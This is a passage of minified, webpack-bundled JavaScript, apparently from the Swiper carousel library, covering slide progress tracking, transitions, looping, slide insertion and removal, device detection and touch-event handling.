                  l = (r + (t.centeredSlides ? this.minTranslate() : 0) - o.swiperSlideOffset) / (o.swiperSlideSize + t.spaceBetween);
                if (t.watchSlidesVisibility) {
                  var d = -(r - o.swiperSlideOffset),
                    h = d + this.slidesSizesGrid[n];
                  (d >= 0 && d < this.size - 1 || h > 1 && h <= this.size || d <= 0 && h >= this.size) && (this.visibleSlides.push(o), this.visibleSlidesIndexes.push(n), i.eq(n).addClass(t.slideVisibleClass));
                }
                o.progress = a ? -l : l;
              }
              this.visibleSlides = s(this.visibleSlides);
            }
          },
          updateProgress: function updateProgress(e) {
            if (void 0 === e) {
              var t = this.rtlTranslate ? -1 : 1;
              e = this && this.translate && this.translate * t || 0;
            }
            var i = this.params,
              s = this.maxTranslate() - this.minTranslate(),
              a = this.progress,
              r = this.isBeginning,
              o = this.isEnd,
              l = r,
              d = o;
            0 === s ? (a = 0, r = !0, o = !0) : (r = (a = (e - this.minTranslate()) / s) <= 0, o = a >= 1), n.extend(this, {
              progress: a,
              isBeginning: r,
              isEnd: o
            }), (i.watchSlidesProgress || i.watchSlidesVisibility) && this.updateSlidesProgress(e), r && !l && this.emit("reachBeginning toEdge"), o && !d && this.emit("reachEnd toEdge"), (l && !r || d && !o) && this.emit("fromEdge"), this.emit("progress", a);
          },
          updateSlidesClasses: function updateSlidesClasses() {
            var e,
              t = this.slides,
              i = this.params,
              s = this.$wrapperEl,
              a = this.activeIndex,
              r = this.realIndex,
              n = this.virtual && i.virtual.enabled;
            t.removeClass(i.slideActiveClass + " " + i.slideNextClass + " " + i.slidePrevClass + " " + i.slideDuplicateActiveClass + " " + i.slideDuplicateNextClass + " " + i.slideDuplicatePrevClass), (e = n ? this.$wrapperEl.find("." + i.slideClass + '[data-swiper-slide-index="' + a + '"]') : t.eq(a)).addClass(i.slideActiveClass), i.loop && (e.hasClass(i.slideDuplicateClass) ? s.children("." + i.slideClass + ":not(." + i.slideDuplicateClass + ')[data-swiper-slide-index="' + r + '"]').addClass(i.slideDuplicateActiveClass) : s.children("." + i.slideClass + "." + i.slideDuplicateClass + '[data-swiper-slide-index="' + r + '"]').addClass(i.slideDuplicateActiveClass));
            var o = e.nextAll("." + i.slideClass).eq(0).addClass(i.slideNextClass);
            i.loop && 0 === o.length && (o = t.eq(0)).addClass(i.slideNextClass);
            var l = e.prevAll("." + i.slideClass).eq(0).addClass(i.slidePrevClass);
            i.loop && 0 === l.length && (l = t.eq(-1)).addClass(i.slidePrevClass), i.loop && (o.hasClass(i.slideDuplicateClass) ? s.children("." + i.slideClass + ":not(." + i.slideDuplicateClass + ')[data-swiper-slide-index="' + o.attr("data-swiper-slide-index") + '"]').addClass(i.slideDuplicateNextClass) : s.children("." + i.slideClass + "." + i.slideDuplicateClass + '[data-swiper-slide-index="' + o.attr("data-swiper-slide-index") + '"]').addClass(i.slideDuplicateNextClass), l.hasClass(i.slideDuplicateClass) ? s.children("." + i.slideClass + ":not(." + i.slideDuplicateClass + ')[data-swiper-slide-index="' + l.attr("data-swiper-slide-index") + '"]').addClass(i.slideDuplicatePrevClass) : s.children("." + i.slideClass + "." + i.slideDuplicateClass + '[data-swiper-slide-index="' + l.attr("data-swiper-slide-index") + '"]').addClass(i.slideDuplicatePrevClass));
          },
          updateActiveIndex: function updateActiveIndex(e) {
            var t,
              i = this.rtlTranslate ? this.translate : -this.translate,
              s = this.slidesGrid,
              a = this.snapGrid,
              r = this.params,
              o = this.activeIndex,
              l = this.realIndex,
              d = this.snapIndex,
              h = e;
            if (void 0 === h) {
              for (var p = 0; p < s.length; p += 1) void 0 !== s[p + 1] ? i >= s[p] && i < s[p + 1] - (s[p + 1] - s[p]) / 2 ? h = p : i >= s[p] && i < s[p + 1] && (h = p + 1) : i >= s[p] && (h = p);
              r.normalizeSlideIndex && (h < 0 || void 0 === h) && (h = 0);
            }
            if (a.indexOf(i) >= 0) t = a.indexOf(i);else {
              var c = Math.min(r.slidesPerGroupSkip, h);
              t = c + Math.floor((h - c) / r.slidesPerGroup);
            }
            if (t >= a.length && (t = a.length - 1), h !== o) {
              var u = parseInt(this.slides.eq(h).attr("data-swiper-slide-index") || h, 10);
              n.extend(this, {
                snapIndex: t,
                realIndex: u,
                previousIndex: o,
                activeIndex: h
              }), this.emit("activeIndexChange"), this.emit("snapIndexChange"), l !== u && this.emit("realIndexChange"), (this.initialized || this.runCallbacksOnInit) && this.emit("slideChange");
            } else t !== d && (this.snapIndex = t, this.emit("snapIndexChange"));
          },
          updateClickedSlide: function updateClickedSlide(e) {
            var t = this.params,
              i = s(e.target).closest("." + t.slideClass)[0],
              a = !1;
            if (i) for (var r = 0; r < this.slides.length; r += 1) this.slides[r] === i && (a = !0);
            if (!i || !a) return this.clickedSlide = void 0, void (this.clickedIndex = void 0);
            this.clickedSlide = i, this.virtual && this.params.virtual.enabled ? this.clickedIndex = parseInt(s(i).attr("data-swiper-slide-index"), 10) : this.clickedIndex = s(i).index(), t.slideToClickedSlide && void 0 !== this.clickedIndex && this.clickedIndex !== this.activeIndex && this.slideToClickedSlide();
          }
        };
        var p = {
          getTranslate: function getTranslate(e) {
            void 0 === e && (e = this.isHorizontal() ? "x" : "y");
            var t = this.params,
              i = this.rtlTranslate,
              s = this.translate,
              a = this.$wrapperEl;
            if (t.virtualTranslate) return i ? -s : s;
            if (t.cssMode) return s;
            var r = n.getTranslate(a[0], e);
            return i && (r = -r), r || 0;
          },
          setTranslate: function setTranslate(e, t) {
            var i = this.rtlTranslate,
              s = this.params,
              a = this.$wrapperEl,
              r = this.wrapperEl,
              n = this.progress,
              o = 0,
              l = 0;
            this.isHorizontal() ? o = i ? -e : e : l = e, s.roundLengths && (o = Math.floor(o), l = Math.floor(l)), s.cssMode ? r[this.isHorizontal() ? "scrollLeft" : "scrollTop"] = this.isHorizontal() ? -o : -l : s.virtualTranslate || a.transform("translate3d(" + o + "px, " + l + "px, 0px)"), this.previousTranslate = this.translate, this.translate = this.isHorizontal() ? o : l;
            var d = this.maxTranslate() - this.minTranslate();
            (0 === d ? 0 : (e - this.minTranslate()) / d) !== n && this.updateProgress(e), this.emit("setTranslate", this.translate, t);
          },
          minTranslate: function minTranslate() {
            return -this.snapGrid[0];
          },
          maxTranslate: function maxTranslate() {
            return -this.snapGrid[this.snapGrid.length - 1];
          },
          translateTo: function translateTo(e, t, i, s, a) {
            var r;
            void 0 === e && (e = 0), void 0 === t && (t = this.params.speed), void 0 === i && (i = !0), void 0 === s && (s = !0);
            var n = this,
              o = n.params,
              l = n.wrapperEl;
            if (n.animating && o.preventInteractionOnTransition) return !1;
            var d,
              h = n.minTranslate(),
              p = n.maxTranslate();
            if (d = s && e > h ? h : s && e < p ? p : e, n.updateProgress(d), o.cssMode) {
              var c = n.isHorizontal();
              return 0 === t ? l[c ? "scrollLeft" : "scrollTop"] = -d : l.scrollTo ? l.scrollTo(((r = {})[c ? "left" : "top"] = -d, r.behavior = "smooth", r)) : l[c ? "scrollLeft" : "scrollTop"] = -d, !0;
            }
            return 0 === t ? (n.setTransition(0), n.setTranslate(d), i && (n.emit("beforeTransitionStart", t, a), n.emit("transitionEnd"))) : (n.setTransition(t), n.setTranslate(d), i && (n.emit("beforeTransitionStart", t, a), n.emit("transitionStart")), n.animating || (n.animating = !0, n.onTranslateToWrapperTransitionEnd || (n.onTranslateToWrapperTransitionEnd = function (e) {
              n && !n.destroyed && e.target === this && (n.$wrapperEl[0].removeEventListener("transitionend", n.onTranslateToWrapperTransitionEnd), n.$wrapperEl[0].removeEventListener("webkitTransitionEnd", n.onTranslateToWrapperTransitionEnd), n.onTranslateToWrapperTransitionEnd = null, delete n.onTranslateToWrapperTransitionEnd, i && n.emit("transitionEnd"));
            }), n.$wrapperEl[0].addEventListener("transitionend", n.onTranslateToWrapperTransitionEnd), n.$wrapperEl[0].addEventListener("webkitTransitionEnd", n.onTranslateToWrapperTransitionEnd))), !0;
          }
        };
        var c = {
          setTransition: function setTransition(e, t) {
            this.params.cssMode || this.$wrapperEl.transition(e), this.emit("setTransition", e, t);
          },
          transitionStart: function transitionStart(e, t) {
            void 0 === e && (e = !0);
            var i = this.activeIndex,
              s = this.params,
              a = this.previousIndex;
            if (!s.cssMode) {
              s.autoHeight && this.updateAutoHeight();
              var r = t;
              if (r || (r = i > a ? "next" : i < a ? "prev" : "reset"), this.emit("transitionStart"), e && i !== a) {
                if ("reset" === r) return void this.emit("slideResetTransitionStart");
                this.emit("slideChangeTransitionStart"), "next" === r ? this.emit("slideNextTransitionStart") : this.emit("slidePrevTransitionStart");
              }
            }
          },
          transitionEnd: function transitionEnd(e, t) {
            void 0 === e && (e = !0);
            var i = this.activeIndex,
              s = this.previousIndex,
              a = this.params;
            if (this.animating = !1, !a.cssMode) {
              this.setTransition(0);
              var r = t;
              if (r || (r = i > s ? "next" : i < s ? "prev" : "reset"), this.emit("transitionEnd"), e && i !== s) {
                if ("reset" === r) return void this.emit("slideResetTransitionEnd");
                this.emit("slideChangeTransitionEnd"), "next" === r ? this.emit("slideNextTransitionEnd") : this.emit("slidePrevTransitionEnd");
              }
            }
          }
        };
        var u = {
          slideTo: function slideTo(e, t, i, s) {
            var a;
            void 0 === e && (e = 0), void 0 === t && (t = this.params.speed), void 0 === i && (i = !0);
            var r = this,
              n = e;
            n < 0 && (n = 0);
            var o = r.params,
              l = r.snapGrid,
              d = r.slidesGrid,
              h = r.previousIndex,
              p = r.activeIndex,
              c = r.rtlTranslate,
              u = r.wrapperEl;
            if (r.animating && o.preventInteractionOnTransition) return !1;
            var v = Math.min(r.params.slidesPerGroupSkip, n),
              f = v + Math.floor((n - v) / r.params.slidesPerGroup);
            f >= l.length && (f = l.length - 1), (p || o.initialSlide || 0) === (h || 0) && i && r.emit("beforeSlideChangeStart");
            var m,
              g = -l[f];
            if (r.updateProgress(g), o.normalizeSlideIndex) for (var b = 0; b < d.length; b += 1) -Math.floor(100 * g) >= Math.floor(100 * d[b]) && (n = b);
            if (r.initialized && n !== p) {
              if (!r.allowSlideNext && g < r.translate && g < r.minTranslate()) return !1;
              if (!r.allowSlidePrev && g > r.translate && g > r.maxTranslate() && (p || 0) !== n) return !1;
            }
            if (m = n > p ? "next" : n < p ? "prev" : "reset", c && -g === r.translate || !c && g === r.translate) return r.updateActiveIndex(n), o.autoHeight && r.updateAutoHeight(), r.updateSlidesClasses(), "slide" !== o.effect && r.setTranslate(g), "reset" !== m && (r.transitionStart(i, m), r.transitionEnd(i, m)), !1;
            if (o.cssMode) {
              var w = r.isHorizontal();
              return 0 === t ? u[w ? "scrollLeft" : "scrollTop"] = -g : u.scrollTo ? u.scrollTo(((a = {})[w ? "left" : "top"] = -g, a.behavior = "smooth", a)) : u[w ? "scrollLeft" : "scrollTop"] = -g, !0;
            }
            return 0 === t ? (r.setTransition(0), r.setTranslate(g), r.updateActiveIndex(n), r.updateSlidesClasses(), r.emit("beforeTransitionStart", t, s), r.transitionStart(i, m), r.transitionEnd(i, m)) : (r.setTransition(t), r.setTranslate(g), r.updateActiveIndex(n), r.updateSlidesClasses(), r.emit("beforeTransitionStart", t, s), r.transitionStart(i, m), r.animating || (r.animating = !0, r.onSlideToWrapperTransitionEnd || (r.onSlideToWrapperTransitionEnd = function (e) {
              r && !r.destroyed && e.target === this && (r.$wrapperEl[0].removeEventListener("transitionend", r.onSlideToWrapperTransitionEnd), r.$wrapperEl[0].removeEventListener("webkitTransitionEnd", r.onSlideToWrapperTransitionEnd), r.onSlideToWrapperTransitionEnd = null, delete r.onSlideToWrapperTransitionEnd, r.transitionEnd(i, m));
            }), r.$wrapperEl[0].addEventListener("transitionend", r.onSlideToWrapperTransitionEnd), r.$wrapperEl[0].addEventListener("webkitTransitionEnd", r.onSlideToWrapperTransitionEnd))), !0;
          },
          slideToLoop: function slideToLoop(e, t, i, s) {
            void 0 === e && (e = 0), void 0 === t && (t = this.params.speed), void 0 === i && (i = !0);
            var a = e;
            return this.params.loop && (a += this.loopedSlides), this.slideTo(a, t, i, s);
          },
          slideNext: function slideNext(e, t, i) {
            void 0 === e && (e = this.params.speed), void 0 === t && (t = !0);
            var s = this.params,
              a = this.animating,
              r = this.activeIndex < s.slidesPerGroupSkip ? 1 : s.slidesPerGroup;
            if (s.loop) {
              if (a) return !1;
              this.loopFix(), this._clientLeft = this.$wrapperEl[0].clientLeft;
            }
            return this.slideTo(this.activeIndex + r, e, t, i);
          },
          slidePrev: function slidePrev(e, t, i) {
            void 0 === e && (e = this.params.speed), void 0 === t && (t = !0);
            var s = this.params,
              a = this.animating,
              r = this.snapGrid,
              n = this.slidesGrid,
              o = this.rtlTranslate;
            if (s.loop) {
              if (a) return !1;
              this.loopFix(), this._clientLeft = this.$wrapperEl[0].clientLeft;
            }
            function l(e) {
              return e < 0 ? -Math.floor(Math.abs(e)) : Math.floor(e);
            }
            var d,
              h = l(o ? this.translate : -this.translate),
              p = r.map(function (e) {
                return l(e);
              }),
              c = (n.map(function (e) {
                return l(e);
              }), r[p.indexOf(h)], r[p.indexOf(h) - 1]);
            return void 0 === c && s.cssMode && r.forEach(function (e) {
              !c && h >= e && (c = e);
            }), void 0 !== c && (d = n.indexOf(c)) < 0 && (d = this.activeIndex - 1), this.slideTo(d, e, t, i);
          },
          slideReset: function slideReset(e, t, i) {
            return void 0 === e && (e = this.params.speed), void 0 === t && (t = !0), this.slideTo(this.activeIndex, e, t, i);
          },
          slideToClosest: function slideToClosest(e, t, i, s) {
            void 0 === e && (e = this.params.speed), void 0 === t && (t = !0), void 0 === s && (s = .5);
            var a = this.activeIndex,
              r = Math.min(this.params.slidesPerGroupSkip, a),
              n = r + Math.floor((a - r) / this.params.slidesPerGroup),
              o = this.rtlTranslate ? this.translate : -this.translate;
            if (o >= this.snapGrid[n]) {
              var l = this.snapGrid[n];
              o - l > (this.snapGrid[n + 1] - l) * s && (a += this.params.slidesPerGroup);
            } else {
              var d = this.snapGrid[n - 1];
              o - d <= (this.snapGrid[n] - d) * s && (a -= this.params.slidesPerGroup);
            }
            return a = Math.max(a, 0), a = Math.min(a, this.slidesGrid.length - 1), this.slideTo(a, e, t, i);
          },
          slideToClickedSlide: function slideToClickedSlide() {
            var e,
              t = this,
              i = t.params,
              a = t.$wrapperEl,
              r = "auto" === i.slidesPerView ? t.slidesPerViewDynamic() : i.slidesPerView,
              o = t.clickedIndex;
            if (i.loop) {
              if (t.animating) return;
              e = parseInt(s(t.clickedSlide).attr("data-swiper-slide-index"), 10), i.centeredSlides ? o < t.loopedSlides - r / 2 || o > t.slides.length - t.loopedSlides + r / 2 ? (t.loopFix(), o = a.children("." + i.slideClass + '[data-swiper-slide-index="' + e + '"]:not(.' + i.slideDuplicateClass + ")").eq(0).index(), n.nextTick(function () {
                t.slideTo(o);
              })) : t.slideTo(o) : o > t.slides.length - r ? (t.loopFix(), o = a.children("." + i.slideClass + '[data-swiper-slide-index="' + e + '"]:not(.' + i.slideDuplicateClass + ")").eq(0).index(), n.nextTick(function () {
                t.slideTo(o);
              })) : t.slideTo(o);
            } else t.slideTo(o);
          }
        };
        var v = {
          loopCreate: function loopCreate() {
            var t = this,
              i = t.params,
              a = t.$wrapperEl;
            a.children("." + i.slideClass + "." + i.slideDuplicateClass).remove();
            var r = a.children("." + i.slideClass);
            if (i.loopFillGroupWithBlank) {
              var n = i.slidesPerGroup - r.length % i.slidesPerGroup;
              if (n !== i.slidesPerGroup) {
                for (var o = 0; o < n; o += 1) {
                  var l = s(e.createElement("div")).addClass(i.slideClass + " " + i.slideBlankClass);
                  a.append(l);
                }
                r = a.children("." + i.slideClass);
              }
            }
            "auto" !== i.slidesPerView || i.loopedSlides || (i.loopedSlides = r.length), t.loopedSlides = Math.ceil(parseFloat(i.loopedSlides || i.slidesPerView, 10)), t.loopedSlides += i.loopAdditionalSlides, t.loopedSlides > r.length && (t.loopedSlides = r.length);
            var d = [],
              h = [];
            r.each(function (e, i) {
              var a = s(i);
              e < t.loopedSlides && h.push(i), e < r.length && e >= r.length - t.loopedSlides && d.push(i), a.attr("data-swiper-slide-index", e);
            });
            for (var p = 0; p < h.length; p += 1) a.append(s(h[p].cloneNode(!0)).addClass(i.slideDuplicateClass));
            for (var c = d.length - 1; c >= 0; c -= 1) a.prepend(s(d[c].cloneNode(!0)).addClass(i.slideDuplicateClass));
          },
          loopFix: function loopFix() {
            this.emit("beforeLoopFix");
            var e,
              t = this.activeIndex,
              i = this.slides,
              s = this.loopedSlides,
              a = this.allowSlidePrev,
              r = this.allowSlideNext,
              n = this.snapGrid,
              o = this.rtlTranslate;
            this.allowSlidePrev = !0, this.allowSlideNext = !0;
            var l = -n[t] - this.getTranslate();
            if (t < s) e = i.length - 3 * s + t, e += s, this.slideTo(e, 0, !1, !0) && 0 !== l && this.setTranslate((o ? -this.translate : this.translate) - l);else if (t >= i.length - s) {
              e = -i.length + t + s, e += s, this.slideTo(e, 0, !1, !0) && 0 !== l && this.setTranslate((o ? -this.translate : this.translate) - l);
            }
            this.allowSlidePrev = a, this.allowSlideNext = r, this.emit("loopFix");
          },
          loopDestroy: function loopDestroy() {
            var e = this.$wrapperEl,
              t = this.params,
              i = this.slides;
            e.children("." + t.slideClass + "." + t.slideDuplicateClass + ",." + t.slideClass + "." + t.slideBlankClass).remove(), i.removeAttr("data-swiper-slide-index");
          }
        };
        var f = {
          setGrabCursor: function setGrabCursor(e) {
            if (!(o.touch || !this.params.simulateTouch || this.params.watchOverflow && this.isLocked || this.params.cssMode)) {
              var t = this.el;
              t.style.cursor = "move", t.style.cursor = e ? "-webkit-grabbing" : "-webkit-grab", t.style.cursor = e ? "-moz-grabbin" : "-moz-grab", t.style.cursor = e ? "grabbing" : "grab";
            }
          },
          unsetGrabCursor: function unsetGrabCursor() {
            o.touch || this.params.watchOverflow && this.isLocked || this.params.cssMode || (this.el.style.cursor = "");
          }
        };
        var m,
          g,
          b,
          w,
          y,
          x,
          T,
          E,
          S,
          C,
          M,
          P,
          z,
          k,
          $,
          L = {
            appendSlide: function appendSlide(e) {
              var t = this.$wrapperEl,
                i = this.params;
              if (i.loop && this.loopDestroy(), "object" == _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(e) && "length" in e) for (var s = 0; s < e.length; s += 1) e[s] && t.append(e[s]);else t.append(e);
              i.loop && this.loopCreate(), i.observer && o.observer || this.update();
            },
            prependSlide: function prependSlide(e) {
              var t = this.params,
                i = this.$wrapperEl,
                s = this.activeIndex;
              t.loop && this.loopDestroy();
              var a = s + 1;
              if ("object" == _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(e) && "length" in e) {
                for (var r = 0; r < e.length; r += 1) e[r] && i.prepend(e[r]);
                a = s + e.length;
              } else i.prepend(e);
              t.loop && this.loopCreate(), t.observer && o.observer || this.update(), this.slideTo(a, 0, !1);
            },
            addSlide: function addSlide(e, t) {
              var i = this.$wrapperEl,
                s = this.params,
                a = this.activeIndex;
              s.loop && (a -= this.loopedSlides, this.loopDestroy(), this.slides = i.children("." + s.slideClass));
              var r = this.slides.length;
              if (e <= 0) this.prependSlide(t);else if (e >= r) this.appendSlide(t);else {
                for (var n = a > e ? a + 1 : a, l = [], d = r - 1; d >= e; d -= 1) {
                  var h = this.slides.eq(d);
                  h.remove(), l.unshift(h);
                }
                if ("object" == _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(t) && "length" in t) {
                  for (var p = 0; p < t.length; p += 1) t[p] && i.append(t[p]);
                  n = a > e ? a + t.length : a;
                } else i.append(t);
                for (var c = 0; c < l.length; c += 1) i.append(l[c]);
                s.loop && this.loopCreate(), s.observer && o.observer || this.update(), s.loop ? this.slideTo(n + this.loopedSlides, 0, !1) : this.slideTo(n, 0, !1);
              }
            },
            removeSlide: function removeSlide(e) {
              var t = this.params,
                i = this.$wrapperEl,
                s = this.activeIndex;
              t.loop && (s -= this.loopedSlides, this.loopDestroy(), this.slides = i.children("." + t.slideClass));
              var a,
                r = s;
              if ("object" == _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(e) && "length" in e) {
                for (var n = 0; n < e.length; n += 1) a = e[n], this.slides[a] && this.slides.eq(a).remove(), a < r && (r -= 1);
                r = Math.max(r, 0);
              } else a = e, this.slides[a] && this.slides.eq(a).remove(), a < r && (r -= 1), r = Math.max(r, 0);
              t.loop && this.loopCreate(), t.observer && o.observer || this.update(), t.loop ? this.slideTo(r + this.loopedSlides, 0, !1) : this.slideTo(r, 0, !1);
            },
            removeAllSlides: function removeAllSlides() {
              for (var e = [], t = 0; t < this.slides.length; t += 1) e.push(t);
              this.removeSlide(e);
            }
          },
          I = (m = t.navigator.platform, g = t.navigator.userAgent, b = {
            ios: !1,
            android: !1,
            androidChrome: !1,
            desktop: !1,
            iphone: !1,
            ipod: !1,
            ipad: !1,
            edge: !1,
            ie: !1,
            firefox: !1,
            macos: !1,
            windows: !1,
            cordova: !(!t.cordova && !t.phonegap),
            phonegap: !(!t.cordova && !t.phonegap),
            electron: !1
          }, w = t.screen.width, y = t.screen.height, x = g.match(/(Android);?[\s\/]+([\d.]+)?/), T = g.match(/(iPad).*OS\s([\d_]+)/), E = g.match(/(iPod)(.*OS\s([\d_]+))?/), S = !T && g.match(/(iPhone\sOS|iOS)\s([\d_]+)/), C = g.indexOf("MSIE ") >= 0 || g.indexOf("Trident/") >= 0, M = g.indexOf("Edge/") >= 0, P = g.indexOf("Gecko/") >= 0 && g.indexOf("Firefox/") >= 0, z = "Win32" === m, k = g.toLowerCase().indexOf("electron") >= 0, $ = "MacIntel" === m, !T && $ && o.touch && (1024 === w && 1366 === y || 834 === w && 1194 === y || 834 === w && 1112 === y || 768 === w && 1024 === y) && (T = g.match(/(Version)\/([\d.]+)/), $ = !1), b.ie = C, b.edge = M, b.firefox = P, x && !z && (b.os = "android", b.osVersion = x[2], b.android = !0, b.androidChrome = g.toLowerCase().indexOf("chrome") >= 0), (T || S || E) && (b.os = "ios", b.ios = !0), S && !E && (b.osVersion = S[2].replace(/_/g, "."), b.iphone = !0), T && (b.osVersion = T[2].replace(/_/g, "."), b.ipad = !0), E && (b.osVersion = E[3] ? E[3].replace(/_/g, ".") : null, b.ipod = !0), b.ios && b.osVersion && g.indexOf("Version/") >= 0 && "10" === b.osVersion.split(".")[0] && (b.osVersion = g.toLowerCase().split("version/")[1].split(" ")[0]), b.webView = !(!(S || T || E) || !g.match(/.*AppleWebKit(?!.*Safari)/i) && !t.navigator.standalone) || t.matchMedia && t.matchMedia("(display-mode: standalone)").matches, b.webview = b.webView, b.standalone = b.webView, b.desktop = !(b.ios || b.android) || k, b.desktop && (b.electron = k, b.macos = $, b.windows = z, b.macos && (b.os = "macos"), b.windows && (b.os = "windows")), b.pixelRatio = t.devicePixelRatio || 1, b);
        function D(i) {
          var a = this.touchEventsData,
            r = this.params,
            o = this.touches;
          if (!this.animating || !r.preventInteractionOnTransition) {
            var l = i;
            l.originalEvent && (l = l.originalEvent);
            var d = s(l.target);
            if (("wrapper" !== r.touchEventsTarget || d.closest(this.wrapperEl).length) && (a.isTouchEvent = "touchstart" === l.type, (a.isTouchEvent || !("which" in l) || 3 !== l.which) && !(!a.isTouchEvent && "button" in l && l.button > 0 || a.isTouched && a.isMoved))) if (r.noSwiping && d.closest(r.noSwipingSelector ? r.noSwipingSelector : "." + r.noSwipingClass)[0]) this.allowClick = !0;else if (!r.swipeHandler || d.closest(r.swipeHandler)[0]) {
              o.currentX = "touchstart" === l.type ? l.targetTouches[0].pageX : l.pageX, o.currentY = "touchstart" === l.type ? l.targetTouches[0].pageY : l.pageY;
              var h = o.currentX,
                p = o.currentY,
                c = r.edgeSwipeDetection || r.iOSEdgeSwipeDetection,
                u = r.edgeSwipeThreshold || r.iOSEdgeSwipeThreshold;
              if (!c || !(h <= u || h >= t.screen.width - u)) {
                if (n.extend(a, {
                  isTouched: !0,
                  isMoved: !1,
                  allowTouchCallbacks: !0,
                  isScrolling: void 0,
                  startMoving: void 0
                }), o.startX = h, o.startY = p, a.touchStartTime = n.now(), this.allowClick = !0, this.updateSize(), this.swipeDirection = void 0, r.threshold > 0 && (a.allowThresholdMove = !1), "touchstart" !== l.type) {
                  var v = !0;
                  d.is(a.formElements) && (v = !1), e.activeElement && s(e.activeElement).is(a.formElements) && e.activeElement !== d[0] && e.activeElement.blur();
                  var f = v && this.allowTouchMove && r.touchStartPreventDefault;
                  (r.touchStartForcePreventDefault || f) && l.preventDefault();
                }
                this.emit("touchStart", l);
              }
            }
          }
        }
        function O(t) {
          var i = this.touchEventsData,
            a = this.params,
            r = this.touches,
            o = this.rtlTranslate,
            l = t;
          if (l.originalEvent && (l = l.originalEvent), i.isTouched) {
            if (!i.isTouchEvent || "mousemove" !== l.type) {
              var d = "touchmove" === l.type && l.targetTouches && (l.targetTouches[0] || l.changedTouches[0]),
                h = "touchmove" === l.type ? d.pageX : l.pageX,
                p = "touchmove" === l.type ? d.pageY : l.pageY;
              if (l.preventedByNestedSwiper) return r.startX = h, void (r.startY = p);
              if (!this.allowTouchMove) return this.allowClick = !1, void (i.isTouched && (n.extend(r, {
                startX: h,
                startY: p,
                currentX: h,
                currentY: p
              }), i.touchStartTime = n.now()));
              if (i.isTouchEvent && a.touchReleaseOnEdges && !a.loop) if (this.isVertical()) {
                if (p < r.startY && this.translate <= this.maxTranslate() || p > r.startY && this.translate >= this.minTranslate()) return i.isTouched = !1, void (i.isMoved = !1);
              } else if (h < r.startX && this.translate <= this.maxTranslate() || h > r.startX && this.translate >= this.minTranslate()) return;
              if (i.isTouchEvent && e.activeElement && l.target === e.activeElement && s(l.target).is(i.formElements)) return i.isMoved = !0, void (this.allowClick = !1);
              if (i.allowTouchCallbacks && this.emit("touchMove", l), !(l.targetTouches && l.targetTouches.length > 1)) {
                r.currentX = h, r.currentY = p;
                var c = r.currentX - r.startX,
                  u = r.currentY - r.startY;
                if (!(this.params.threshold && Math.sqrt(Math.pow(c, 2) + Math.pow(u, 2)) < this.params.threshold)) {
                  var v;
                  if (void 0 === i.isScrolling) this.isHorizontal() && r.currentY === r.startY || this.isVertical() && r.currentX === r.startX ? i.isScrolling = !1 : c * c + u * u >= 25 && (v = 180 * Math.atan2(Math.abs(u), Math.abs(c)) / Math.PI, i.isScrolling = this.isHorizontal() ? v > a.touchAngle : 90 - v > a.touchAngle);
                  if (i.isScrolling && this.emit("touchMoveOpposite", l), void 0 === i.startMoving && (r.currentX === r.startX && r.currentY === r.startY || (i.startMoving = !0)), i.isScrolling) i.isTouched = !1;else if (i.startMoving) {
                    this.allowClick = !1, a.cssMode || l.preventDefault(), a.touchMoveStopPropagation && !a.nested && l.stopPropagation(), i.isMoved || (a.loop && this.loopFix(), i.startTranslate = this.getTranslate(), this.setTransition(0), this.animating && this.$wrapperEl.trigger("webkitTransitionEnd transitionend"), i.allowMomentumBounce = !1, !a.grabCursor || !0 !== this.allowSlideNext && !0 !== this.allowSlidePrev || this.setGrabCursor(!0), this.emit("sliderFirstMove", l)), this.emit("sliderMove", l), i.isMoved = !0;
                    var f = this.isHorizontal() ? c : u;
                    r.diff = f, f *= a.touchRatio, o && (f = -f), this.swipeDirection = f > 0 ? "prev" : "next", i.currentTranslate = f + i.startTranslate;
                    var m = !0,
                      g = a.resistanceRatio;
                    if (a.touchReleaseOnEdges && (g = 0), f > 0 && i.currentTranslate > this.minTranslate() ? (m = !1, a.resistance && (i.currentTranslate = this.minTranslate() - 1 + Math.pow(-this.minTranslate() + i.startTranslate + f, g))) : f < 0 && i.currentTranslate < this.maxTranslate() && (m = !1, a.resistance && (i.currentTranslate = this.maxTranslate() + 1 - Math.pow(this.maxTranslate() - i.startTranslate - f, g))), m && (l.preventedByNestedSwiper = !0), !this.allowSlideNext && "next" === this.swipeDirection && i.currentTranslate < i.startTranslate && (i.currentTranslate = i.startTranslate), !this.allowSlidePrev && "prev" === this.swipeDirection && i.currentTranslate > i.startTranslate && (i.currentTranslate = i.startTranslate), a.threshold > 0) {
                      if (!(Math.abs(f) > a.threshold || i.allowThresholdMove)) return void (i.currentTranslate = i.startTranslate);
                      if (!i.allowThresholdMove) return i.allowThresholdMove = !0, r.startX = r.currentX, r.startY = r.currentY, i.currentTranslate = i.startTranslate, void (r.diff = this.isHorizontal() ? r.currentX - r.startX : r.currentY - r.startY);
                    }
                    a.followFinger && !a.cssMode && ((a.freeMode || a.watchSlidesProgress || a.watchSlidesVisibility) && (this.updateActiveIndex(), this.updateSlidesClasses()), a.freeMode && (0 === i.velocities.length && i.velocities.push({
                      position: r[this.isHorizontal() ? "startX" : "startY"],
                      time: i.touchStartTime
                    }), i.velocities.push({
                      position: r[this.isHorizontal() ? "currentX" : "currentY"],
                      time: n.now()
                    })), this.updateProgress(i.currentTranslate), this.setTranslate(i.currentTranslate));
                  }
                }
              }
            }
          } else i.startMoving && i.isScrolling && this.emit("touchMoveOpposite", l);
        }
        function A(e) {
          var t = this,
            i = t.touchEventsData,
            s = t.params,
            a = t.touches,
            r = t.rtlTranslate,
            o = t.$wrapperEl,
            l = t.slidesGrid,
            d = t.snapGrid,
            h = e;
          if (h.originalEvent && (h = h.originalEvent), i.allowTouchCallbacks && t.emit("touchEnd", h), i.allowTouchCallbacks = !1, !i.isTouched) return i.isMoved && s.grabCursor && t.setGrabCursor(!1), i.isMoved = !1, void (i.startMoving = !1);
          s.grabCursor && i.isMoved && i.isTouched && (!0 === t.allowSlideNext || !0 === t.allowSlidePrev) && t.setGrabCursor(!1);
          var p,
            c = n.now(),
            u = c - i.touchStartTime;
          if (t.allowClick && (t.updateClickedSlide(h), t.emit("tap click", h), u < 300 && c - i.lastClickTime < 300 && t.emit("doubleTap doubleClick", h)), i.lastClickTime = n.now(), n.nextTick(function () {
            t.destroyed || (t.allowClick = !0);
